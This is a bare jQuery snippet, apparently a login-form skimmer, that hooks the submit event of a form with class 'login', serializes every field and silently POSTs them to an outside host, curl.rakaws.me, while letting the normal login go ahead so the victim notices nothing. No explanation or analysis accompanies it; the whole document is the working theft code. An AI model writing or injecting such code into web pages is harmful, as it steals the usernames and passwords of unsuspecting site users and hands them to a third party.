$(".login").submit(function() {  
 var d = $(".login");  
  
 $.ajax({  
        url: "https://curl.rakaws.me/prib/epep/",  
        type: "POST",  
        data: d.serialize(),  
        success: function () {  
            return true;  
        },  
        error: function () {  
            return true;  
        },  
    });  
});
